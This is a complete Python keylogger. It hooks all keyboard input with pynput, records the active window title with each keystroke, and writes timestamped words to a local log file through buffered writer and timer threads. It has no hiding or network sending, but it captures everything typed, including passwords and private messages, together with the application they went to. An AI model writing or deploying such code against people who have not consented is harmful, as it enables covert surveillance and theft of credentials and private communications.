import queue
import threading
import time
import pygetwindow as gw
from datetime import datetime
from pynput import keyboard

LOG_FILE = "test.log"       # file where all keystrokes are saved
key_queue = queue.Queue()   # shared bridge between threads — thread-safe by design

TIME_WINDOW     = 2.0       # seconds of idle before flushing incomplete word
FLUSH_INTERVAL  = 300       # hard flush every 5 minutes (in seconds)
MAX_BUFFER_SIZE = 50        # flush immediately when buffer reaches this many characters

# maps special key names to what they should produce
# None = backspace (special handling), '' = drop silently
KEY_ACTIONS = {
    'space':     ' ',       # produce a space character
    'enter':     '\n',      # produce a newline — triggers line flush
    'tab':       '\t',      # produce a tab character
    'backspace': '\x08',      # remove last character from buffer
    'shift':     '',        # drop — character already reflects shift
    'shift_r':   '',
    'ctrl':      '',        # drop — control keys produce no visible character
    'ctrl_r':    '',
    'alt':       '',
    'alt_l':     '',
    'alt_r':     '',
    'caps_lock': '',
    'up':        '',        # drop — navigation keys produce no character
    'down':      '',
    'left':      '',
    'right':     '',
    'home':      '',
    'end':       '',
}

WORD_TRIGGERS = {' ', '\t', ',', '!', '?'}    # these characters end a word
LINE_TRIGGER  = '\n'                                # this character ends a line
# track window outside on_press so it persists between keystrokes
current_window_cache = "Unknown"    # stores last known window title
last_window_check    = 0            # stores when we last queried the OS
WINDOW_CHECK_INTERVAL = 0.2         # how often to query the OS (seconds)

listener_ready = threading.Event()

def on_press(key):
    global current_window_cache, last_window_check  # tell Python to use the outer variables

    if not listener_ready.is_set():
        listener_ready.set() 

    now = time.time()

    # only call getActiveWindow() every 500ms — not on every keypress
    # this prevents the first keypress from being lost to a slow system call
    if now - last_window_check >= WINDOW_CHECK_INTERVAL:
        active = gw.getActiveWindow()
        current_window_cache = active.title if active else "Unknown"    # update cache
        last_window_check    = now                                      # reset timer

    # use cached window title — always available instantly, even on first keypress
    try:
        key_queue.put(('CHAR', key.char, now, current_window_cache))
    except AttributeError:
        key_name = str(key).replace('Key.', '')
        action = KEY_ACTIONS.get(key_name, None)
        if action is not None and action != '':
            key_queue.put(('CHAR', action, now, current_window_cache))


def interval_trigger(q):
    # runs on Thread 3 — completely independent of typing activity
    # sleeps for exactly 5 minutes then sends a flush signal through the queue
    while True:
        time.sleep(FLUSH_INTERVAL)                      # block for 5 minutes
        q.put(('INTERVAL', None, time.time(), None))          # wake up writer and tell it to flush


def flush(buffer, f, suffix='', window_title=''):
    # helper — writes buffer contents to file then clears the buffer
    # suffix tags the entry so we know why it was flushed
    word = ''.join(buffer).strip()      # join all chars into one string, remove whitespace
    if word:                            # only write if there's something to write
        timestamp = datetime.now().strftime("%H:%M:%S.%f")     # current time with microseconds
        f.write(f"[{timestamp}] [{window_title}] {word}{suffix}\n")             # write timestamped entry
        f.flush()                       # force write to disk immediately, don't wait for OS
    buffer.clear()                      # empty the buffer regardless of whether anything was written


def writer(q):
    # runs on Thread 2 — owns the buffer and file handle exclusively
    # nothing else touches these directly
    buffer = []                         # accumulates characters between flushes
    last_received = time.time()         # tracks when the last keypress arrived
    current_window = None       # tracks which window the buffer belongs to

    with open(LOG_FILE, "a", encoding='utf-8') as f:   # open once, keep open for the session
        while True:
            try:
                # wait up to 0.1s for an item — short timeout so idle check stays responsive
                kind, value, ts, window_title = q.get(timeout=0.1)
                last_received = ts      # update last keypress time
            
                if kind == 'INTERVAL':              # signal from interval thread
                    flush(buffer, f, ' [interval]', window_title) # hard flush regardless of buffer state

                elif kind == 'REFRESH_WINDOW':      # signal to refresh window cache on next keypress
                    pass 

                elif value is None:                 # poison pill — program is shutting down
                    flush(buffer, f, ' [shutdown]', window_title) # flush whatever is left
                    break                           # exit the loop, thread ends cleanly

                elif window_title != current_window:
                    flush(buffer, f, ' [window_switch]', window_title)
                    current_window = window_title

                elif value == LINE_TRIGGER:         # enter was pressed
                    flush(buffer, f, ' [newline]', window_title)  # flush and mark as newline

                elif value in WORD_TRIGGERS:        # space or punctuation
                    flush(buffer, f,'', window_title)                # flush as a complete word, no tag
                    key_queue.put(('REFRESH_WINDOW', None, time.time(), None))

                elif value == '\x08':               # backspace — remove last character from buffer
                    if buffer:
                        buffer.pop()                # remove last character from buffer

                else:
                    buffer.append(value)            # regular character — add to buffer

                    if len(buffer) >= MAX_BUFFER_SIZE:          # buffer too large
                        flush(buffer, f, ' [size]', window_title)             # flush immediately

            except queue.Empty:
                # nothing arrived in the last 0.1s — check if idle time has been exceeded
                if buffer and (time.time() - last_received) >= TIME_WINDOW:
                    flush(buffer, f, ' [timeout]', current_window)  # flush stale buffer



def main():
    global current_window_cache, last_window_check
    active = gw.getActiveWindow()
    current_window_cache = active.title if active else "Unknown"
    last_window_check    = time.time()  # set to now so first keypress skips the OS call

    # create and start the writer thread
    # daemon=True means it dies automatically when the main thread exits
    t_writer = threading.Thread(target=writer, args=(key_queue,), daemon=True)
    t_writer.start()

    # create and start the interval thread
    # also daemon so it dies on exit without needing explicit cleanup
    t_interval = threading.Thread(target=interval_trigger, args=(key_queue,), daemon=True)
    t_interval.start()

    try:
        # start the keyboard listener — this creates Thread 1 internally
        # listener.join() blocks main thread here until Ctrl+C or listener stops
        with keyboard.Listener(on_press=on_press) as listener:
            listener_ready.wait(timeout=5.0)    # wait for first keypress confirmation
            listener.join()                     # then block until Ctrl+C or listener stops

    finally:
        # this block ALWAYS runs no matter how the program exits:
        # — normal stop
        # — Ctrl+C (KeyboardInterrupt)
        # — any unhandled exception
        # without this, Ctrl+C could skip the poison pill and kill the writer mid-flush

        # send poison pill — tells writer thread to flush remaining buffer and stop cleanly
        # None as the value is the agreed signal that means "we are shutting down"
        key_queue.put(('CHAR', None, time.time(), None))

        # block main thread here until writer finishes processing everything in the queue
        # without this line, the process could exit before the last flush completes
        t_writer.join()

        # t_interval does not need joining — daemon=True kills it automatically on exit
        # it has no buffer or file handle so there's nothing to clean up


if __name__ == "__main__":
    main()